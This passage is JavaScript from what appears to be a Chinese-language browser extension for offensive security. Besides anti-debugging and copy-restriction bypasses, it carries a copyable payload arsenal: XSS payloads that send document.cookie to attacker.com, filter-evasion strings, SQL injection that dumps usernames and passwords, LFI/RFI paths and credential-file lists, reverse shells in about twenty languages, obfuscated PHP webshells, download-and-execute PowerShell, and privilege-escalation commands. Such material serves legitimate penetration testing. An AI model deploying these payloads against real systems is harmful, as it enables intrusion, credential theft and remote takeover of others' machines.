            '<div class="antidebug-item"><span class="antidebug-desc">已扫描 ' +
            scannedCount +
            ' 个外部 JS 文件</span></div>';
        }
        resultsEl.innerHTML = html;
        updateAntidebugIndicator(
          'danger',
          '检测到 ' + detections.length + ' 项反调试 — 可点击绕过'
        );
      }
    } catch (e) {
      antiDebugScanned = false;
      statusEl.textContent = '扫描失败';
      resultsEl.innerHTML = '<div class="empty-state">' + utils.escapeHtml(e.message) + '</div>';
      updateAntidebugIndicator('off', '扫描失败');
    }
  }

  async function bypassAntiDebug() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.id) return;

    try {
      await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: () => {
          // Override Function constructor to strip debugger
          const OriginalFunction = Function.prototype.constructor;
          Function.prototype.constructor = function (...args) {
            if (args.length > 0 && typeof args[0] === 'string') {
              args[0] = args[0].replace(/debugger/g, '');
              if (/^\s*$/.test(args[0])) return function () {};
            }
            return new OriginalFunction(...args);
          };

          // Override eval to strip debugger
          const originalEval = window.eval;
          window.eval = function (code) {
            if (typeof code === 'string') {
              code = code.replace(/debugger/g, '');
            }
            return originalEval.call(window, code);
          };

          // Override setInterval/setTimeout to neutralize debugger callbacks
          const originalSetInterval = window.setInterval;
          const originalSetTimeout = window.setTimeout;

          function cleanCallback(fn) {
            if (typeof fn === 'string') {
              return fn.replace(/debugger/g, '');
            }
            if (typeof fn === 'function') {
              const fnStr = fn.toString();
              if (fnStr.includes('debugger')) {
                return function () {
                  try {
                    fn();
                  } catch (e) {
                    /* ignore debugger */
                  }
                };
              }
            }
            return fn;
          }

          window.setInterval = function (fn, delay, ...args) {
            return originalSetInterval.call(window, cleanCallback(fn), delay, ...args);
          };

          window.setTimeout = function (fn, delay, ...args) {
            return originalSetTimeout.call(window, cleanCallback(fn), delay, ...args);
          };

          // Restore console if overridden
          if (!console.log.restore) {
            const log = console.log;
            console.log = function (...args) {
              const stack = new Error().stack;
              const callerLine = stack ? stack.split('\n')[2] || '' : '';
              if (callerLine.includes('debugger')) return;
              return log.apply(console, args);
            };
            console.log.restore = true;
          }

          return true;
        },
      });

      antiDebugBypassActive = true;
      updateAntidebugIndicator('on', '反调试绕过已生效（刷新页面后失效）');
      utils.showToast('反调试绕过已注入，对当前页面立即生效（刷新后会丢失）', 'success');
    } catch (e) {
      antiDebugBypassActive = false;
      updateAntidebugIndicator('off', '绕过注入失败');
      utils.showToast('注入失败: ' + e.message, 'error');
    }
  }

  async function clearScriptBlock() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.id) return;

    try {
      await chrome.runtime.sendMessage({
        type: 'TOGGLE_JS',
        tabId: tab.id,
        url: tab.url,
        enable: true,
      });
      jsBlocked = false;
      antiDebugBypassActive = false;
      antiDebugScanned = false;
      chrome.storage.local.remove('js_blocked_tabId');
      updateJsToggleStatus();
      updateAntidebugIndicator('on', '未检测 / 未绕过');
      var statusEl = utils.get('antidebug-status');
      if (statusEl) statusEl.textContent = '';
      var resultsEl = utils.get('antidebug-results');
      if (resultsEl)
        resultsEl.innerHTML =
          '<div class="empty-state">点击「扫描反调试」检测页面中的反调试手段</div>';
      utils.showToast('已清除所有脚本拦截规则', 'success');
    } catch (e) {
      utils.showToast('操作失败: ' + e.message, 'error');
    }
  }

  // ====== Remove Copy Restrictions ======
  var uncopyActive = false;

  function updateUncopyIndicator(state, text) {
    var dot = utils.get('uncopy-indicator-dot');
    var label = utils.get('uncopy-indicator-label');
    if (dot && label) {
      if (state === 'warn') dot.className = 'js-toggle-dot js-toggle-dot-warn';
      else if (state === 'off') dot.className = 'js-toggle-dot js-toggle-dot-off';
      else dot.className = 'js-toggle-dot js-toggle-dot-on';
      label.textContent = text;
    }
  }

  async function removeCopyRestrictions() {
    var btn = utils.get('uncopy-btn');
    if (btn) btn.disabled = true;
    updateUncopyIndicator('warn', '正在解除...');

    var tab;
    try {
      tab = (await chrome.tabs.query({ active: true, currentWindow: true }))[0];
    } catch (e) {}
    if (!tab?.id) {
      updateUncopyIndicator('off', '无法获取当前标签页');
      if (btn) btn.disabled = false;
      return;
    }

    try {
      var results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        world: 'MAIN',
        func: function () {
          var log = {};

          // 1. Remove user-select: none from all elements
          var allEls = document.querySelectorAll('*');
          var userSelectCount = 0;
          for (var i = 0; i < allEls.length; i++) {
            var el = allEls[i];
            var style = window.getComputedStyle(el);
            var us = style.getPropertyValue('user-select') || style.webkitUserSelect;
            if (us === 'none' || us === '-webkit-none') {
              el.style.setProperty('user-select', 'auto', 'important');
              el.style.setProperty('-webkit-user-select', 'auto', 'important');
              el.style.webkitUserSelect = 'auto';
              userSelectCount++;
            }
          }
          log.userSelect = userSelectCount;

          // 2. Remove inline oncopy/oncut/onpaste/onselectstart/oncontextmenu/ondragstart
          var eventAttrs = [
            'oncopy',
            'oncut',
            'onpaste',
            'onselectstart',
            'oncontextmenu',
            'ondragstart',
            'onbeforecopy',
            'onbeforecut',
            'onbeforepaste',
          ];
          var inlineAttrCount = 0;
          for (var j = 0; j < allEls.length; j++) {
            for (var a = 0; a < eventAttrs.length; a++) {
              if (allEls[j].hasAttribute(eventAttrs[a])) {
                allEls[j].removeAttribute(eventAttrs[a]);
                inlineAttrCount++;
              }
            }
          }
          log.inlineAttrs = inlineAttrCount;

          // 3. Remove body-level event listeners via addEventListener capture override
          var blockEvents = ['copy', 'cut', 'paste', 'selectstart', 'contextmenu', 'dragstart'];
          var listenerCount = 0;
          blockEvents.forEach(function (evt) {
            document.addEventListener(
              evt,
              function (e) {
                e.stopImmediatePropagation();
              },
              true
            );
            document.body.addEventListener(
              evt,
              function (e) {
                e.stopImmediatePropagation();
              },
              true
            );
            listenerCount++;
          });
          log.captureListeners = blockEvents.length;

          // 4. Override preventDefault on document level events
          var origPreventDefault = Event.prototype.preventDefault;
          var blockTypes = {};
          blockEvents.forEach(function (t) {
            blockTypes[t] = true;
          });
          Event.prototype.preventDefault = function () {
            if (this.type && blockTypes[this.type]) return;
            origPreventDefault.call(this);
          };
          log.preventOverride = true;

          // 5. Remove pointer-events: none overlays
          var pointerCount = 0;
          for (var k = 0; k < allEls.length; k++) {
            var s = window.getComputedStyle(allEls[k]);
            if (s.getPropertyValue('pointer-events') === 'none') {
              var tag = allEls[k].tagName.toLowerCase();
              var isTransparent =
                s.getPropertyValue('opacity') === '0' ||
                s.getPropertyValue('background') === 'rgba(0, 0, 0, 0)' ||
                s.backgroundColor === 'transparent';
              if (
                isTransparent &&
                (tag === 'div' || tag === 'span' || tag === 'a' || tag === 'img')
              ) {
                allEls[k].style.setProperty('pointer-events', 'auto', 'important');
                allEls[k].style.display = 'none';
                pointerCount++;
              }
            }
          }
          log.pointerOverlays = pointerCount;

          // 6. Remove -webkit-user-drag: none
          var dragCount = 0;
          for (var m = 0; m < allEls.length; m++) {
            if (allEls[m].style.webkitUserDrag === 'none') {
              allEls[m].style.webkitUserDrag = 'auto';
              dragCount++;
            }
          }
          log.dragRestrictions = dragCount;

          return log;
        },
      });

      var log = results?.[0]?.result;
      if (!log) {
        updateUncopyIndicator('off', '注入失败');
        if (btn) btn.disabled = false;
        return;
      }

      // Render log
      var logEl = utils.get('uncopy-log');
      if (logEl) {
        var html = '';
        if (log.userSelect > 0)
          html +=
            '<div class="uncopy-log-entry"><span class="log-ok">+</span> 解除 <span class="log-count">' +
            log.userSelect +
            '</span> 个元素的 user-select: none</div>';
        if (log.inlineAttrs > 0)
          html +=
            '<div class="uncopy-log-entry"><span class="log-ok">+</span> 移除 <span class="log-count">' +
            log.inlineAttrs +
            '</span> 个内联事件拦截</div>';
        if (log.pointerOverlays > 0)
          html +=
            '<div class="uncopy-log-entry"><span class="log-ok">+</span> 隐藏 <span class="log-count">' +
            log.pointerOverlays +
            '</span> 个透明遮罩层</div>';
        if (log.dragRestrictions > 0)
          html +=
            '<div class="uncopy-log-entry"><span class="log-ok">+</span> 解除 <span class="log-count">' +
            log.dragRestrictions +
            '</span> 个拖拽限制</div>';
        if (log.captureListeners)
          html +=
            '<div class="uncopy-log-entry"><span class="log-ok">+</span> 注册 <span class="log-count">' +
            log.captureListeners +
            '</span> 种 capture 事件拦截</div>';
        if (log.preventOverride)
          html +=
            '<div class="uncopy-log-entry"><span class="log-ok">+</span> 覆写 preventDefault 拦截</div>';
        if (!html) html = '<div class="uncopy-log-entry">页面无复制限制</div>';
        logEl.innerHTML = html;
      }

      uncopyActive = true;
      updateUncopyIndicator('on', '复制限制已解除');
      utils.showToast('复制限制已解除', 'success');
    } catch (e) {
      uncopyActive = false;
      updateUncopyIndicator('off', '操作失败');
      utils.showToast('操作失败: ' + e.message, 'error');
    }
  }

  // ====== Payload Tools ======
  const XSS_DATA = {
    'Cookie 窃取': [
      '<scr' +
        'ipt>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</scr' +
        'ipt>',
      '<scr' +
        "ipt>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</scr" +
        'ipt>',
      '<scr' +
        "ipt>fetch('http://attacker.com',{method:'POST',body:document.cookie});</scr" +
        'ipt>',
      '<scr' +
        'ipt>new Audio("http://attacker.com/steal.php?cookie="+document.cookie);</scr' +
        'ipt>',
    ],
    '基础 XSS': [
      '<scr' + "ipt>alert('XSS')</scr" + 'ipt>',
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "<body onload=alert('XSS')>",
    ],
    'Img 标签': [
      "<img src=x onerror=alert('XSS')>",
      '<img src=x onerror="javascript:alert(\'XSS\')">',
      '<img """><scr' + "ipt>alert('XSS')</scr" + 'ipt">',
      '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
      '<img src=1 onerror=alert(1)>',
      '<img src=x:alert(alt) onerror=eval(src) alt=0>',
      '<img src="x" onerror="&#97;lert(1)">',
      '<img src=x onerror=alert`1`>',
    ],
    'Markdown 注入': [
      "[click](javascript:alert('XSS'))",
      "![image](javascript:alert('XSS'))",
      '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=)',
      "<details open ontoggle=alert('XSS')>",
    ],
    'SVG 注入': [
      "<svg onload=alert('XSS')>",
      '<svg><scr' + "ipt>alert('XSS')</scr" + 'ipt></svg>',
      "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
      "<svg><set onmouseover=alert('XSS') attributeName=onmouseover to=alert(1)>",
    ],
    '\u7ed5\u8fc7\u9ed1\u540d\u5355': [
      '<scr' + "ipt>eval(atob('YWxlcnQoJ1hTUycp'));<\/scr" + 'ipt>',
      '<scr' + "ipt>Function(atob('YWxlcnQoJ1hTUycp'))();<\/scr" + 'ipt>',
      '<scr' + "ipt>['alert'].forEach(function(f){window[f]('XSS')});<\/scr" + 'ipt>',
      '<scr' + "ipt>window['al'+'ert']('XSS');<\/scr" + 'ipt>',
      '<scr' + "ipt>self['al'+'ert']('XSS');<\/scr" + 'ipt>',
      '<scr' + "ipt>top['al'+'ert']('XSS');<\/scr" + 'ipt>',
      '<scr' + "ipt>parent['al'+'ert']('XSS');<\/scr" + 'ipt>',
    ],
  };

  function buildSqliPayloads(n, table) {
    const nulls = Array(n).fill('NULL').join(',');
    return {
      列数探测: [
        "' ORDER BY 1--+",
        "' ORDER BY 2--+",
        ...Array.from({ length: n }, (_, i) => `' ORDER BY ${i + 1}--+`),
        `' UNION SELECT ${nulls}--+`,
      ],
      版本枚举: [
        `' UNION SELECT NULL,version(),NULL--+`.replace('NULL,NULL,NULL', nulls),
        `' UNION SELECT NULL,@@version,NULL--+`.replace('NULL,NULL,NULL', nulls),
        `' UNION SELECT NULL,@@GLOBAL.VERSION,NULL--+`.replace('NULL,NULL,NULL', nulls),
      ],
      表名枚举: [
        `' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--+`,
        `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--+`,
      ],
      列名枚举: [
        `' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='${table}'--+`,
      ],
      数据提取: [
        `' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password),NULL FROM ${table}--+`,
        `' UNION SELECT NULL,username||':'||password,NULL FROM ${table}--+`,
      ],
      报错注入: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--+",
        "' AND 1=CAST((SELECT version()) AS INT)--+",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--+",
      ],
      延时注入: [
        "' AND IF(1=1,SLEEP(5),0)--+",
        "' AND (SELECT SLEEP(5))--+",
        "'; WAITFOR DELAY '0:0:5'--+",
      ],
      认证绕过: ["' OR 1=1--+", "' OR '1'='1", "admin'--", "' OR '1'='1'/*"],
      'Order Union': [
        `' ORDER BY 1 UNION SELECT NULL,username,password FROM ${table}--+`,
        `' ORDER BY 1,2 UNION SELECT NULL,load_file('/etc/passwd'),NULL--+`,
      ],
    };
  }

  const LFI_DATA = {
    目录遍历: [
      '../../../../../../../../../../etc/passwd',
      '../../../../../../../../../../etc/shadow',
      '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    ],
    'PHP Wrapper': [
      'php://filter/convert.base64-encode/resource=../../../../etc/passwd',
      'php://filter/convert.base64-encode/resource=index.php',
      'expect://ls',
      'php://input (POST body)',
      'data://text/plain,<?php phpinfo();?>',
    ],
    RFI: ['http://evil.com/shell.txt', 'http://evil.com/shell.php?cmd=id'],
    'Linux 敏感文件': [
      '/etc/passwd',
      '/etc/shadow',
      '/etc/group',
      '/etc/hostname',
      '/etc/issue',
      '/etc/ssh/ssh_config',
      '/etc/ssh/sshd_config',
      '/root/.ssh/id_rsa',
      '/root/.ssh/authorized_keys',
      '/home/$USER/.ssh/id_rsa',
      '/home/$USER/.bash_history',
      '/proc/self/environ',
      '/proc/mounts',
      '/var/run/secrets/kubernetes.io/serviceaccount/token',
    ],
    'Apache 配置': [
      '/etc/apache2/apache2.conf',
      '/etc/apache2/sites-available/000-default.conf',
      '/etc/httpd/conf/httpd.conf',
      '/usr/local/etc/apache2/httpd.conf',
      '/var/log/apache2/access.log',
      '/var/log/apache2/error.log',
    ],
    'MySQL 文件': [
      '/var/lib/mysql/mysql/user.frm',
      '/var/lib/mysql/mysql/user.MYD',
      '/var/lib/mysql/mysql/user.MYI',
    ],
    'Windows 敏感文件': [
      '/boot.ini',
      '/windows/system32/drivers/etc/hosts',
      '/windows/repair/SAM',
      '/windows/panther/unattend.xml',
      '/windows/system32/license.rtf',
    ],
  };

  const REVERSE_SHELLS = {
    bash: { name: 'Bash TCP', cmd: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1', tags: ['linux', 'mac'] },
    netcat: {
      name: 'Netcat mkfifo',
      cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
      tags: ['linux'],
    },
    'nc-e': { name: 'Netcat -e', cmd: 'nc -e /bin/sh {ip} {port}', tags: ['linux'] },
    ncat: { name: 'Ncat', cmd: 'ncat {ip} {port} -e /bin/bash', tags: ['linux'] },
    python: {
      name: 'Python',
      cmd: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
      tags: ['linux', 'mac'],
    },
    python3: {
      name: 'Python3',
      cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
      tags: ['linux', 'mac'],
    },
    perl: {
      name: 'Perl',
      cmd: 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
      tags: ['linux'],
    },
    php: {
      name: 'PHP',
      cmd: 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh <&3 >&3 2>&3");\'',
      tags: ['linux'],
    },
    ruby: {
      name: 'Ruby',
      cmd: 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
      tags: ['linux', 'mac'],
    },
    powershell: {
      name: 'PowerShell',
      cmd: '$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()',
      tags: ['windows'],
    },
    'powershell-tls': {
      name: 'PowerShell TLS',
      cmd: '$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();$ssl=New-Object System.Net.Security.SslStream($s,$false);[void]$ssl.AuthenticateAsClient("{ip}");$sb=New-Object System.Text.StringBuilder;while($true){$sb.Clear();[byte[]]$b=0..65535|%{0};$t=$ssl.Read($b,0,$b.Length);$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$t);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$ssl.Write([text.encoding]::ASCII.GetBytes($r2),0,$r2.Length);$ssl.Flush()};$c.Close()',
      tags: ['windows'],
    },
    nodejs: {
      name: 'Node.js',
      cmd: "require('child_process').exec('nc -e /bin/sh {ip} {port}')",
      tags: ['linux', 'mac', 'windows'],
    },
    java: {
      name: 'Java',
      cmd: 'Runtime rt = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}; Process p = rt.exec(cmd);',
      tags: ['linux'],
    },
    socat: {
      name: 'Socat',
      cmd: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
      tags: ['linux'],
    },
    telnet: {
      name: 'Telnet',
      cmd: 'rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p',
      tags: ['linux'],
    },
    zsh: {
      name: 'Zsh',
      cmd: "zsh -c 'zmodload -i zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0<&$REPLY'",
      tags: ['linux', 'mac'],
    },
    lua: {
      name: 'Lua',
      cmd: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3')\"",
      tags: ['linux'],
    },
    golang: {
      name: 'Golang',
      cmd: 'echo \'package main;import "os/exec";func main(){exec.Command("/bin/sh","-i").Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
      tags: ['linux'],
    },
    awk: {
      name: 'Awk',
      cmd: 'awk \'BEGIN{s="/inet/tcp/0/{ip}/{port}";while(1){do{printf "$ "|&s;s|&getline c;if(c){while((c|&s)>0)print $0|&s;close(c)}}while(c!="exit")}}\'',
      tags: ['linux'],
    },
    dart: {
      name: 'Dart',
      cmd: "import 'dart:io';import 'dart:convert';main(){Socket.connect('{ip}',{port}).then((s){s.cast<List<int>>().transform(Utf8Encoder()).pipe(s);stdin.pipe(s);});}",
      tags: ['linux', 'mac', 'windows'],
    },
  };

  const WEBSHELL_DATA = {
    基础一句话: [
      '<?php @eval($_POST["cmd"]);?>',
      '<?php system($_GET["cmd"]);?>',
      '<?php passthru($_GET["cmd"]);?>',
      '<?php echo shell_exec($_GET["cmd"]);?>',
    ],
    混淆一句话: [
      '<?=`$_GET[0]`?>',
      '<?=`$_POST[0]`?>',
      '<?=`${$_REQUEST["_"]}`?>',
      '<?php $a="sys"."tem";$a($_GET["cmd"]);?>',
      '<?php $_GET["a"]($_GET["b"]);?>',
      '<?php @assert($_POST["cmd"]);?>',
    ],
    图片马: ['GIF89a<?php @eval($_POST["cmd"]);?>', 'GIF89a<?=`$_GET[0]`?>'],
    文件上传利用: [
      '<?php file_put_contents("shell.php","<?php @eval(\\$_POST[cmd]);?>");?>',
      '<?php move_uploaded_file($_FILES["f"]["tmp_name"],"shell.php");?>',
    ],
    '绕过 disable_functions': [
      '<?php putenv("LD_PRELOAD=/tmp/evil.so");mail("a","a","a");?>',
      '<?php ini_set("disable_functions","");?>',
    ],
  };

  const CMDREF_DATA = {
    'Linux SUID 提权': [
      'find / -user root -perm -4000 -exec ls -ldb {} \\;',
      'find / -perm -u=s -type f 2>/dev/null',
      "find / -name '*.txt' 2>/dev/null",
      'getcap -r / 2>/dev/null',
    ],
    系统版本信息: [
      'cat /etc/issue',
      'cat /etc/*-release*',
      'cat /etc/lsb-release',
      'uname -a',
      'cat /proc/version',
    ],
    环境变量: ['env', 'set', 'cat /etc/profile', 'cat /etc/bashrc', '~/.bash_history'],
    'Cron 任务': [
      'crontab -l',
      'ls -alh /var/spool/cron',
      'cat /etc/crontab',
      'ls -la /etc/cron.d',
      'cat /etc/at.allow',
      'cat /etc/at.deny',
    ],
    端口转发: [
      'ssh -L 8080:target:80 user@remote',
      'ssh -R 8080:target:80 user@remote',
      'mkfifo backpipe; nc -l 8080 0<backpipe | nc target 80 1>backpipe',
      'socat TCP-LISTEN:8080,fork TCP:target:80',
      'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080',
    ],
    'TTY Shell 升级': [
      'python3 -c \'import pty;pty.spawn("/bin/bash")\'',
      'echo os.system("/bin/bash")',
      'perl -e \'exec "/bin/sh";\'',
      'lua -e "os.execute(\'/bin/sh\')"',
      '/bin/sh -i',
      '# 步骤2: export TERM=xterm',
      '# 步骤3: Ctrl+Z → stty raw -echo; fg',
      '# 步骤4: stty rows 38 columns 116',
    ],
    'PowerShell 系统枚举': [
      'systeminfo',
      'Get-WmiObject Win32_ComputerSystem',
      '$env:COMPUTERNAME',
      '$env:USERNAME',
      'whoami /all',
      'Get-Process | Select-Object Name,Id',
    ],
    'PowerShell 补丁信息': [
      'Get-HotFix | sort InstalledOn -Desc | ft -AutoSize',
      'wmic qfe get Caption,Description,HotFixID,InstalledOn',
    ],
    'PowerShell 网络信息': [
      'ipconfig /all',
      'netstat -ano',
      'Get-NetTCPConnection',
      'route print',
      'arp -a',
    ],
    'PowerShell 文件下载': [
      'Invoke-WebRequest -Uri "http://url/file" -OutFile "C:\\output"',
      'certutil -urlcache -f http://url/file C:\\output',
      '(New-Object Net.WebClient).DownloadFile("http://url/file","C:\\output")',
      'IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")',
    ],
    'PowerShell WLAN 密码': [
      'netsh wlan show profiles',
      'netsh wlan show profile name="PROFILE" key=clear',
    ],
    通配符提权: [
      'touch --checkpoint-action=exec=sh shell.sh --checkpoint=1',
      'tar cf /dev/null * --checkpoint=1 --checkpoint-action=exec=sh shell.sh',
    ],
  };

  function renderPayloadCategories(containerId, data, collapsed) {
    const container = utils.get(containerId);
    if (!container) return;
    container.innerHTML = '';
    Object.entries(data).forEach(([title, items]) => {
      const isOpen = !collapsed;
      const cat = document.createElement('div');
      cat.className = 'payload-category';
      cat.innerHTML = `
        <div class="payload-category-title">
          <span>${utils.escapeHtml(title)} <span class="payload-count-badge">${items.length}</span></span>
          <span class="payload-category-arrow${isOpen ? ' open' : ''}">&#9654;</span>
        </div>
        <div class="payload-category-items${isOpen ? ' open' : ''}">
          ${items
            .map(
              item => `
            <div class="payload-item">
              <code class="payload-item-code" title="${utils.escapeHtml(item)}">${utils.escapeHtml(item)}</code>
              <button class="payload-item-copy" data-payload="${utils.escapeHtml(item)}">复制</button>
            </div>
          `
            )
            .join('')}
        </div>
      `;
      cat.querySelector('.payload-category-title').addEventListener('click', () => {
        const arrow = cat.querySelector('.payload-category-arrow');
        const itemsEl = cat.querySelector('.payload-category-items');
        arrow.classList.toggle('open');
        itemsEl.classList.toggle('open');
      });
      cat.querySelectorAll('.payload-item-code').forEach(el => {
        el.addEventListener('click', () => utils.copyText(el.dataset.payload || el.textContent));
      });
      cat.querySelectorAll('.payload-item-copy').forEach(btn => {
        btn.addEventListener('click', () => {
          utils.copyText(btn.dataset.payload);
          utils.showToast('已复制', 'success', 1000);
        });
      });
      container.appendChild(cat);
    });
  }

  function switchPayloadTab(tab) {
    document
      .querySelectorAll('.payload-tab')
      .forEach(b => b.classList.toggle('active', b.dataset.ptab === tab));
    document.querySelectorAll('.payload-panel').forEach(p => p.classList.remove('active'));
    const target = utils.get('ptab-' + tab);
    if (target) target.classList.add('active');
  }

  function generateReverseShell() {
    const ip = (utils.get('revshell-ip') || {}).value || '';
    const port = (utils.get('revshell-port') || {}).value || '4444';
    const type = (utils.get('revshell-type') || {}).value || 'bash';
    const output = utils.get('revshell-output');
    if (!ip || !port) {
      if (output) output.value = '请输入 IP 和端口';
      return;
    }
    const shell = REVERSE_SHELLS[type];
    if (!shell || !output) return;
    output.value = shell.cmd.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
  }

  function renderAllReverseShells() {
    const container = utils.get('revshell-all');
    if (!container) return;
    container.innerHTML = '<div class="revshell-section-title">全部 Shell 类型一览</div>';
    const list = document.createElement('div');
    list.className = 'payload-list-container';
    Object.entries(REVERSE_SHELLS).forEach(([key, shell]) => {
      const item = document.createElement('div');
      item.className = 'payload-item';
      const tags = (shell.tags || [])
        .map(t => `<span class="payload-count-badge">${t}</span>`)
        .join(' ');
      item.innerHTML = `
        <code class="payload-item-code" title="${utils.escapeHtml(shell.cmd)}">${utils.escapeHtml(shell.name)} ${tags}</code>
        <button class="payload-item-copy" data-payload="${utils.escapeHtml(shell.cmd)}">复制</button>
      `;
      item
        .querySelector('.payload-item-code')
        .addEventListener('click', () => utils.copyText(shell.cmd));
      item.querySelector('.payload-item-copy').addEventListener('click', () => {
        utils.copyText(shell.cmd);
        utils.showToast('已复制模板 (需替换 IP/Port)', 'info', 1500);
      });
      list.appendChild(item);
    });
    container.appendChild(list);
  }

  function renderSqliPayloads() {
    const n = parseInt((utils.get('sqli-columns') || {}).value) || 3;
    const table = (utils.get('sqli-table') || {}).value || 'users';
    renderPayloadCategories('sqli-categories', buildSqliPayloads(n, table), false);
  }

  // ====== Init ======
  function initApp() {
    // Main panel tabs
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const panel = btn.dataset.panel;
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
        const target = document.getElementById('panel-' + panel);
        if (target) target.classList.add('active');
        utils.get('status-text').textContent = btn.textContent;
      });
    });

    // Encoding sub-tabs
    document.querySelectorAll('.sub-tab-btn').forEach(btn => {
      btn.addEventListener('click', () => switchEncodingTab(btn.dataset.type));
    });

    // Encoding buttons
    const encodingBindings = [
      { id: 'encode-btn', handler: handleEncode },
      { id: 'decode-btn', handler: handleDecode },
      { id: 'clear-encoding-btn', handler: clearEncodingFields },
      {
        id: 'copy-encoding-btn',
        handler: () => {
          const v = utils.get('encoding-output').value;
          if (!v) {
            utils.showToast('没有可复制的内容', 'warning');
            return;
          }
          utils.copyText(v);
          utils.showToast('已复制', 'success');
        },
      },
    ];
    encodingBindings.forEach(({ id, handler }) => {
      const el = utils.get(id);
      if (el) el.addEventListener('click', handler);
    });

    // Crypto algo tabs
    document.querySelectorAll('.crypto-algo-btn').forEach(function (btn) {
      if (btn.dataset.algo)
        btn.addEventListener('click', function () {
          switchCryptoAlgo(btn.dataset.algo);
        });
    });

    // Crypto action buttons
    var cryptoEncBtn = utils.get('crypto-enc-btn');
    if (cryptoEncBtn) cryptoEncBtn.addEventListener('click', doCryptoEncrypt);
    var cryptoDecBtn = utils.get('crypto-dec-btn');
    if (cryptoDecBtn) cryptoDecBtn.addEventListener('click', doCryptoDecrypt);
    var cryptoVerifyBtn = utils.get('crypto-verify-btn');
    if (cryptoVerifyBtn) cryptoVerifyBtn.addEventListener('click', doCryptoVerify);
    var cryptoClearBtn = utils.get('crypto-clear-btn');
    if (cryptoClearBtn)
      cryptoClearBtn.addEventListener('click', function () {
        var ci = utils.get('crypto-input');
        if (ci) ci.value = '';
        var co = utils.get('crypto-output');
        if (co) co.value = '';
      });
    var copyCryptoBtn = utils.get('copy-crypto-btn');
    if (copyCryptoBtn)
      copyCryptoBtn.addEventListener('click', function () {
        var v = (utils.get('crypto-output') || {}).value;
        if (v) {
          utils.copyText(v);
          utils.showToast('已复制', 'success');
        }
      });

    // Crypto mode/IV toggle listeners
    var aesMode = utils.get('aes-mode');
    if (aesMode)
      aesMode.addEventListener('change', function () {
        toggleIvVisibility('aes', 'aes-iv-group', 'aes-mode');
      });
    var desMode = utils.get('des-mode');
    if (desMode)
      desMode.addEventListener('change', function () {
        toggleIvVisibility('des', 'des-iv-group', 'des-mode');
      });
    var sm4Mode = utils.get('sm4-mode');
    if (sm4Mode)
      sm4Mode.addEventListener('change', function () {
        var ivG = utils.get('sm4-iv-group');
        if (ivG) {
          if (sm4Mode.value === 'cbc') ivG.classList.remove('hidden');
          else ivG.classList.add('hidden');
        }
      });

    // SM2 generate keypair
    var sm2GenBtn = utils.get('sm2-genkey-btn');
    if (sm2GenBtn)
      sm2GenBtn.addEventListener('click', function () {
        try {
